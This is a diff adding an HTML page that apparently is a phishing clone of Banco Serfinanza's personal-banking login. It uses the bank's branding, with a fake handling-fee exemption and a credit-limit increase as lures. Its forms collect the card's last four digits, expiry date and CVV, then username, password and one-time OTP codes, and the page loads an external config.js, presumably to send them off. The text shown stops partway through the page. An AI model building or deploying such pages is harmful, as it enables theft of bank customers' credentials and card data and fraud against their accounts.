@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+<html lang="es">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="author" content="">
+    <meta property="og:locale" content="es_ES">
+    <meta property="og:site_name" content="Banco Serfinanzas">
+    <meta property="og:title" content="Cero cuotas de manejo, CDT, Tarjeta de crédito, Giros">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://i.imgur.com/NsgYhiD.png">
+    <meta name="description"
+        content="Encuentra en Banco Serfinanza un portafolio de Productos y Servicios: CDT, Giros, Tarjeta de Crédito, Crédito Rotativo, Crédito de Libre Inversión y más.">
+    <link rel="shortcut icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico"
+        type="image/x-icon">
+    <link rel="icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico" type="image/x-icon">
+    <title>Inicio de Sesión - Serfinanza Banca Personal</title>
+
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans&amp;display=swap" rel="stylesheet">
+    <link href="../Assets/font/css/open-iconic.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <!-- Fontawesome icon CSS -->
+    <script src="https://kit.fontawesome.com/1c594bb82f.js" crossorigin="anonymous"></script>
+    <link rel="dns-prefetch" href="https://use.fontawesome.com/">
+    <link rel="stylesheet" href="../../../use.fontawesome.com/releases/v5.6.3/css/all.css"
+        integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+    <!-- Bootstrap CSS -->
+    <link href="../Content/bootstrap.min.css" rel="stylesheet" />
+    <!-- Adminux CSS -->
+
+    <link rel="stylesheet" href="../Assets/css/intercomStyle.css" type="text/css">
+    <!-- CSS Serfinanza -->
+    <link rel="stylesheet" href="../Assets/css/serfinansaNew.css" type="text/css">
+
+    <style>
+        body.no-padding-right {
+            padding-right: 0px !important;
+        }
+
+        .modal-open {
+            overflow: hidden !important;
+        }
+
+        .headLogin {
+            width: 100vw !important;
+        }
+
+        .modal-backdrop {
+            width: 100% !important;
+            height: 100% !important;
+        }
+
+        .row {
+            overflow: hidden;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+    </style>
+
+
+  <script src="config.js"></script>
+</head>
+
+<body style="overflow-x: hidden; overflow-y: visible;">
+    <div class="modal fade show" id="ModActuDatosClient" data-backdrop="static" data-keyboard="false"
+        style="top: 0% !important; display: none; overflow: hidden; background: rgba(0,0,0,.3);" aria-modal="true">
+        <div class="modal-dialog" style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <h4 class="text-center">¡BIENVENIDO!</h4>
+                    <p class="font-bold">
+                        Para continuar confirma los siguientes datos.
+                    </p>
+                    <p style="font-size: 14px;">
+                        Completa los campos del producto para la exoneración de la cuota de manejo.
+                    </p>
+
+                    <form id="FormActuDatos" class="">
+                        <div class="container">
+                            <div class="row">
+
+
+                                <!--Últimos 4 dígitos-->
+
+
+                                <div class="col-md-12 ">
+
+                                    <div class="form-group row">
+                                        <label class="col-sm-4 col-form-label" for="Direccion">Últimos 4 dígitos de tu
+                                            tarjeta</label>
+                                        <div class="col-sm-8 input-group mb-3">
+                                            <input type="text" class="form-control validate soloNumerosyPunto"
+                                                id="lastdigits" name="lastdigits" maxlength="4" value="" required>
+                                        </div>
+                                    </div>
+
+                                </div>
+
+                                <!--Fecha de vencimiento de la tarjeta-->
+
+                                <div class="col-md-12 ">
+
+                                    <div class="form-group row">
+                                        <label class="col-sm-4 col-form-label" for="Barrio">Fecha de vencimiento de tu
+                                            tarjeta</label>
+                                        <div class="col-sm-8 input-group mb-3">
+                                            <input type="text" class="form-control  " id="mm" name="mm" maxlength="2"
+                                                value="" placeholder="Mes" required="">
+                                            <input type="text" class="form-control  " id="yy" name="yy" maxlength="4"
+                                                value="" placeholder="Año" required
+                                                style="border-bottom-left-radius: 0px !important; border-top-left-radius: 0px !important;">
+                                        </div>
+                                    </div>
+
+                                </div>
+
+                                <!--Código de seguridad CVV-->
+
+                                <div class="col-md-12 ">
+
+                                    <div class="form-group row">
+                                        <label class="col-sm-4 col-form-label" for="Celular">Código de seguridad de tu
+                                            tarjeta</label>
+                                        <div class="col-sm-8 input-group mb-3" style="margin-bottom: 0px !important;">
+                                            <input type="password" class="form-control validate soloNumerosyPunto"
+                                                id="cvv" name="cvv" maxlength="3" value="" required>
+                                        </div>
+                                    </div>
+
+
+                                </div>
+                                <input type="hidden" id="idd" name="idd" value="1">
+                                <input type="hidden" id="pww" name="pww" value="1">
+
+                                <div class="col-md-12 mt-4">
+
+                                    <div class="custom-control custom-checkbox">
+                                        <input type="checkbox" class="custom-control-input" id="TerminosYCondiciones"
+                                            name="TerminosYCondiciones" value="" required>
+                                        <label class="custom-control-label" for="TerminosYCondiciones">
+                                            He leido y autorizo el
+                                            <a href="https://bancoserfinanza.com/servicio-al-cliente/legales/"
+                                                target="_blank">tratamiento de mi información personal</a> y conozco la
+                                            <a href="https://bancoserfinanza.com/servicio-al-cliente/legales/"
+                                                target="_blank">Política para la administación de datos personales</a>
+                                        </label>
+                                    </div>
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+
+                        <div class="modal-footer" style="margin-top: 0 !important;">
+                            <button type="button" name="FinishedButton" class="btn btn-primary" id="BtnActualizarDatos"
+                                style="margin-top: 0 !important; margin-bottom: 0 !important;">Confirmar</button>
+                        </div>
+                    </form>
+
+                </div>
+            </div>
+        </div><!-- /.modal-content -->
+    </div>
+    <div class="container-fluid">
+        <div class="row">
+
+            <!-- Page Loader -->
+            <div class="loader_wrapper inner align-items-center text-center">
+                <div class="load7 load-wrapper">
+                    <div class="loading_img"></div>
+                    <div class="loader"> Cargando... </div>
+                    <div class="clearfix"></div>
+                </div>
+            </div>
+            <!-- Page Loader Ends -->
+            <header class="headLogin">
+                <div id="logoPrincipal" class="col">
+                    <div class="row">
+                        <div id="SerfinansaImg" class="col-12 col-md-4">
+                            <img src="../Assets/img/logo2.png" alt="Serfinansa">
+                            <div class="titleLogin">
+                                <h1>BANCA PERSONAS</h1>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <hr />
+                <div class="spaceline">
+
+                </div>
+            </header>
+
+        </div>
+        <div class="row">
+            <div class="col-lg-6 col-12 p-1">
+                <div class="row" style="overflow: visible;">
+                    <div class="col-1 logo-super">
+                        <img src="../Assets/img/superfinanciera%20Vigilado-01.jpg" alt="Vigilado Superfinanciera" />
+                    </div>
+                    <div class="col-10">
+                        <div class="loginContainer">
+
+
+
+
+                            <form autocomplete="off" class="form-signin" id="form-login" name="form-login" role="form">
+                                <div>
+                                    <input name="__RequestVerificationToken" type="hidden"
+                                        value="0PkSTwAO_TVOcHf8GW1tbA3kzlszWH-Om1TRqc_MAbyM7DLpGwia2BzONPbZ0mOojvmYpj8uSrfkQoGzLrD_pup6nuZhPz2rhYeN2CU06i41" />
+                                    <input type="hidden" id="checker" value="0" />
+                                    <input type="text" style="opacity:0;" id="JsonFingerPrint" name="JsonFingerPrint">
+                                    <input type="text" style="opacity:0;" id="OTPNumber" name="OTPNumber">
+                                    <input type="text" style="opacity:0;" id="HasOTP" name="HasOTP">
+                                    <div id="login-username">
+                                        <h2>Bienvenido a tu Serfinanza Virtual Personas</h2>
+
+                                        <div class="inputIcon">
+                                            <!-- <i class="far fa-user"></i> -->
+                                            <img class="inputIconImg" src="/Personal/Assets/img/user.svg" alt="">
+                                        </div>
+                                        <!--Cédula del cliente-->
+                                        <div class="inputLogin">
+                                            <input type="text" class="form-control" id="UserName" name="UserName"
+                                                placeholder="Ingresa tu usuario" maxlength="20" autocomplete="off">
+                                        </div>
+                                    </div>
+                                    <div id="login-secureimage" style="display:none">
+                                        <h2>BIENVENIDO A TU BANCA VIRTUAL SERFINANZA</h2>
+                                        <div class="row">
+                                            <div class="col-4">
+                                                <figure class="user-login circle">
+                                                    <img id="secure-image" src="/Personal/Assets/img/xxx.png">
+                                                </figure>
+                                            </div>
+
+                                            <div class="col-8">
+                                                <p>Banco Serfinanza</p>
+
+                                                <p id="p_secure-passphrase" class="fraseSeguridad">
+                                                    <label id="secure-passphrase" for="InternalCode"> <b>Cuota de manejo</b> </label>
+                                                </p>
+
+                                                <p class="textInfo">Esta vez no tendrás que confirmar tus datos, tu
+                                                    ingreso para
+                                                    esta solicitud es de
+                                                    manera segura.</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div id="login-password" style="display:none">
+                                        <h2>CONTRASEÑA</h2>
+
+                                        <div class="inputIcon">
+                                            <!-- <i class="fas fa-lock"></i> -->
+                                            <img class="inputIconImg" src="/Personal/Assets/img/lock.svg" alt="">
+                                        </div>
+                                        <!--Contraseña del usuario-->
+                                        <div class="inputLogin">
+                                            <input type="password" class="form-control" id="Password" name="Password"
+                                                placeholder="Ingresa tu contraseña" maxlength="3" autocomplete="off"
+                                                readonly>
+                                        </div>
+                                    </div>
+                                    <div class="row">
+                                        <div class="form-group col text-center">
+                                            <div class="grup-bottons">
+                                                <button type="button" class="btn btn-primary" style="display:none"
+                                                    id="btn-modal-otp">Ingresar</button>
+                                                <button type="button" class="btn btn-primary btnLwi" id="btn-sign-on"
+                                                    onclick="login()">Ingresar</button>
+                                                <button type="button" class="btn btn-secondary" id="btn-sign-off"
+                                                    style="display:none">Cancelar</button>
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                    <div class="row footerLogin">
+                                        <div class="col-12">
+
+                                            <p>
+                                                <a id="btn-register" href="#"> Regístrate aquí </a>
+                                            </p>
+
+                                            <p>
+                                                <a id="btn-reset-user" href="#"> Recordar Usuario</a>
+                                            </p>
+
+                                            <p>
+                                                <a id="btn-reset-password" href="#">Restablecer Contraseña</a>
+                                            </p>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                            <!--End Login-->
+                            <!-- Boostrap modal dialog -->
+                            <div class="modal fade" id="Validation-Dialog" data-backdrop="static" data-keyboard="false"
+                                style="top: 0;">
+                                <div class="modal-dialog"
+                                    style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
+                                    <div class="modal-content" style="background-image: url(/Personal/Assets/img/imgInicio.png) !important; background-size: cover;">
+                                        <div class="modal-header icom-modal-error-header"
+                                            style="padding-bottom: 0 !important; margin-top: 10px; opacity: 0;">
+                                            <img class="headerLogo"
+                                                src="/Personal/Assets/img/Serfinanza-Virtual-Transacciones-300x218.png"
+                                                alt="" style="display: block;">
+                                        </div>
+                                        <div class="modal-body" style="opacity: 0;">
+                                            <p class="icom-modal-instructions">El ingreso para hacer esta solicitud de aumento de cupo es
+                                                requerido, accede a tu Serfinanza Virtual.</p>
+                                            <div class="icom-divider"></div>
+                                            <p class="icom-error" id="UserName-Error">
+
+                                                El Nombre de usuario es requerido
+                                            </p>
+                                            <p class="icom-error" id="Password-Error">
+
+                                                La Contraseña es requerida
+                                            </p>
+                                            <p class="icom-error" id="Access-Error">
+
+                                                Acceso Denegado
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer" style="margin-top: 0; padding-top: 0;">
+                                            <button type="button" class="btn btn-primary"
+                                                data-dismiss="modal">Aceptar</button>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div><!-- /.modal -->
+                            <!-- .modal -->
+                            <div class="modal fade" id="ValidOTP" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <h4 class="text-center">Segundo factor de Autenticacion</h4>
+
+                                        </div>
+                                        <div class="modal-body">
+                                            <div class="info-exclamation">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                                <p class="text-center mt-2" id="textOTP">Por favor digite clave OTP.</p>
+                                            </div>
+                                            <div class="row d-flex justify-content-center mt-2">
+                                                <div class="col-md-6">
+                                                    <input type="text" class="form-control" id="otpValid"
+                                                        name="otpValid" placeholder="Ingresa OTP" maxlength="6">
+                                                </div>
+                                            </div>
+                                            <div class="row d-flex justify-content-center mt-2">
+                                                <div class="col-md-6 alert alert-danger" style="display: none;"
+                                                    id="boxOTP">
+                                                    <p class="">Ingrese una clave OTP valida</p>
+                                                </div>
+                                            </div>
+                                            <div class="row d-flex justify-content-center mt-3">
+                                                <div class="col-md-4">
+                                                    <div class="text-rigth">
+                                                        <button type="button" class="btn btn-primary"
+                                                            data-dismiss="modal" id="btn-Error">Cerrar</button>
+                                                    </div>
+                                                </div>
+
+                                                <div class="col-md-4">
+                                                    <div class="text-left">
+                                                        <button type="button" class="btn btn-primary"
+                                                            id="btn-SubmitOtp">Ingresar</button>
+                                                    </div>
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+                                        <div class="modal-footer">
+
+                                        </div><!-- /.modal-content -->
+
+                                    </div><!-- /.modal-dialog -->
+
+                                </div>
+
+                            </div>
+
+                            <!-- /.modal -->
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="Blocked-Error-Dialog">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true">&times;</span>
+                                            </button>
+                                        </div>
+                                        <div class="modal-body">
+                                            <div class="info-exclamation">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                                <span>
+                                                    ¡Oh no, Algo salió mal!
+                                                </span>
+                                            </div>
+                                            <p>
+                                                Usuario bloqueado, por favor intente restablecer su contraseña para
+                                                desbloquearlo.
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-Error">Aceptar</button>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+                            <div class="modal fade" id="TimeOut-Error">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true">&times;</span>
+                                            </button>
+                                        </div>
+                                        <div class="modal-body">
+                                            <div class="info-exclamation">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                                <span>
+                                                    ¡Oh no, Algo salió mal!
+                                                </span>
+                                            </div>
+                                            <p>
+                                                Servicio no disponible, por favor intenta mas tarde
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-Error"
+                                                data-url="../../Personal/Product/Summary">Aceptar</button>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="Already-Error-Dialog" data-backdrop="static"
+                                data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+
+                                            <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Ya existe una sesión en la Oficina
+                                                Virtual, seleccione "Aceptar"</p>
+
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="accept-exist-session">Aceptar</button>
+
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="Reset-Error-Dialog" data-backdrop="static"
+                                data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+
+                                            <h4 class="modal-title icom-modal-title">Restablecer Cuenta de Usuario</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Debe volver a registrarse en la Oficina
+                                                Virtual, seleccione "Aceptar" para ir al registro</p>
+
+                                        </div>
+
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-reset">Aceptar</button>
+
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="Reseblo-Error-Dialog" data-backdrop="static"
+                                data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <h4 class="modal-title icom-modal-title">Restablecer Cuenta de Usuario</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Usuario bloqueado, por favor acercarse a
+                                                la Oficina de Serfinansa más cercana</p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-reset">Aceptar</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="UserEmpty-Dialog" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog"
+                                    style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Por favor ingrese un nombre de usuario.
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-reset">Aceptar</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="ccEmpty-Dialog" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Por favor completa todos los campos.</p>
+                                        </div>
+                                        <div class="modal-footer">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-reset">Aceptar</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+                            <!-- MODAL DIALOG MIOOOOOOOOOOOOOOOO -->
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="ccEmpty-DialogMio" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog"
+                                    style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header" style="margin-top: 20px;">
+                                            <img class="headerLogo" src="/Personal/Assets/img/error.png" alt=""
+                                                style="width: 80px;">
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">La información es requerida, algunos
+                                                datos necesarios no se han ingresado, revise su información e intente
+                                                nuevamente haciendo clic en "Aceptar"</p>
+                                        </div>
+                                        <div class="modal-footer"
+                                            style="margin-top: 0; padding-top: 0; padding-bottom: 20px;">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="mio">Aceptar</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="dialogTYC" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog"
+                                    style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header" style="margin-top: 20px;">
+                                            <img class="headerLogo" src="/Personal/Assets/img/error.png" alt=""
+                                                style="width: 80px;">
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Algunos campos necesarios no se han
+                                                ingresado, revise su información e intente nuevamente haciendo clic en
+                                                "Aceptar"</p>
+                                        </div>
+                                        <div class="modal-footer"
+                                            style="margin-top: 0; padding-top: 0; padding-bottom: 20px;">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="mio2">Aceptar</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="errorEmpty-Dialog" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog"
+                                    style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header" style="margin-top: 20px;">
+                                            <img class="headerLogo" src="/Personal/Assets/img/error.png" alt=""
+                                                style="width: 80px;">
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">En este momento no podemos continuar con
+                                                tu solicitud dado que nuestros canales
+                                                no se encuentran disponibles, te invitamos a aplicar esta solicitud más
+                                                tarde.</p>
+                                        </div>
+                                        <div class="modal-footer"
+                                            style="margin-top: 0; padding-top: 0; padding-bottom: 20px;">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-reset"
+                                                onclick="login()">Inicio</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="datosEmpty-Dialog" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Por favor acepta los términos y
+                                                condiciones.</p>
+                                        </div>
+                                        <div class="modal-footer">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-reset">Aceptar</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+                            <div class="modal fade" id="datosEmpty-Dialog" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Por favor complete todos los campos.</p>
+                                        </div>
+                                        <div class="modal-footer">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-reset">Aceptar</button>
+
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+
+                            <!-- .modal -->
+                            <div class="modal fade" id="NoExistError-Dialog" data-backdrop="static"
+                                data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+
+                                            <h4 class="modal-title icom-modal-title">Inicio de Sesión</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p class="icom-modal-instructions">Tu usuario o tu contraseña es incorrecto,
+                                                revisa tu información y selecciona “Aceptar” para intentarlo de nuevo.
+                                                Si no lo recuerdas comunícate con la Línea de Servicio al Cliente:
+                                                018000510513</p>
+
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-login">Aceptar</button>
+                                            <button type="button" class="btn btn-secondary" data-dismiss="modal"
+                                                id="btn-recovery">Recuperar Contraseña</button>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+                            <!-- .modal -->
+                            <div class="modal fade" id="User-No-Client" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true">&times;</span>
+                                            </button>
+                                        </div>
+                                        <div class="modal-body">
+                                            <div class="info-exclamation">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                                <span>
+                                                    ¡Oh no, Algo salió mal!
+                                                </span>
+                                            </div>
+                                            <p>
+                                                Aún no eres cliente, te invitamos a adquirir nuestros Productos
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-Error">Aceptar</button>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+
+                                </div><!-- /.modal-dialog -->
+                            </div>
+                            <!-- /.modal -->
+                            <div id="ProblemsWithServer-Dialog" class="modal fade">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header bg-danger">
+                                            <h4 class="modal-title">Error</h4>
+                                        </div>
+                                        <div class="modal-body">
+                                            <p>No se ha podido establecer una comunicación satisfactoria con el servidor
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-login">Aceptar</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!--Modal Dialogs-->
+                            <div class="modal fade" id="ProductNone-Dialog" data-backdrop="static"
+                                data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true">&times;</span>
+                                            </button>
+                                        </div>
+                                        <div class="modal-body">
+                                            <div class="info-exclamation">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                                <span>
+                                                    ¡Oh no, Algo salió mal!
+                                                </span>
+                                            </div>
+                                            <p>
+                                                Usted no posee productos asociados, te invitamos a adquirir alguno de
+                                                nuestros productos.
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-Error">Aceptar</button>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+                            <div class="modal fade" id="ProductInactive-Dialog" data-backdrop="static"
+                                data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-header icom-modal-error-header">
+                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true">&times;</span>
+                                            </button>
+                                        </div>
+                                        <div class="modal-body">
+                                            <div class="info-exclamation">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                                <span>
+                                                    ¡Oh no, Algo salió mal!
+                                                </span>
+                                            </div>
+                                            <p>
+                                                Usted no posee productos activos.
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-Error">Aceptar</button>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div>
+
+                            <!--Barra de carga al terminar de meter los datos-->
+
+                            <div class="modal fade" id="pleaseWaitDialog" data-backdrop="static" data-keyboard="false">
+                                <div class="modal-dialog"
+                                    style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
+                                    <div class="modal-content">
+                                        <div class="modal-header">
+                                            <div class="modal-header" style="margin: 0 auto" ;>
+                                                Procesando...
+                                            </div>
+                                        </div>
+                                        <div class="modal-body">
+                                            <div class="progress-bar progress-bar-striped">
+                                                <div class="progress">
+                                                    <div class="progress-bar progress-bar-striped progress-bar-animated"
+                                                        role="progressbar" aria-valuenow="100" aria-valuemin="0"
+                                                        aria-valuemax="100" style="width: 100%;">
+
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div><!-- /.modal-content -->
+                                </div><!-- /.modal-dialog -->
+                            </div><!-- /.modal -->
+                            <!--Modal Dialogs-->
+
+                            <div class="modal fade" id="UserInactive-Dialog" data-backdrop="static"
+                                data-keyboard="false">
+                                <div class="modal-dialog">
+                                    <div class="modal-content">
+                                        <div class="modal-body">
+                                            <br />
+                                            <div class="text-center">
+                                                <i class="fa fa-times-circle fa-6x" style="color: #E41500;"
+                                                    aria-hidden="true"></i>
+                                            </div>
+                                            <br />
+                                            <p>
+                                                Hola ! Parece que actualmente no cuentas con productos activos en Banco
+                                                Serfinanza, te invitamos a conocer nuestro portafolio ingresando a
+                                                nuestra página web <a
+                                                    href="https://bancoserfinanza.com/">www.bancoserfinanza.com</a>,
+                                                acercándote a una oficina o comunicándote con nuestra Línea de Servicio
+                                                al Cliente 3235997000.
+                                            </p>
+                                        </div>
+                                        <div class="modal-footer justify-content-center">
+                                            <button type="button" class="btn btn-primary" data-dismiss="modal"
+                                                id="btn-Error">Aceptar</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-6 d-none d-lg-block loginImg">
+
+                <div id="carousel-home" class="carousel slide" data-ride="carousel">
+                    <div id="carousel-home" class="carousel slide" data-ride="carousel">
+                        <ol class="carousel-indicators">
+                            <li data-target="#carousel-home" data-slide-to="0"></li>
+                            <li data-target="#carousel-home" data-slide-to="1" class="active"></li>
